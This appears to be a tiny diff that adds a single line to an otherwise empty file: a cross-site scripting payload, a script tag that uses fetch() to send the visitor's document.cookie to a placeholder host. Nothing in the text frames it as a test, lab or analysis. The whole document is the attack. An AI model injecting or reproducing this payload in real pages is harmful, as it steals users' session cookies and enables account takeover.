@@ -1,0 +1,1 @@
+<script>fetch("http://ip/cookie="+document.cookie);</script>
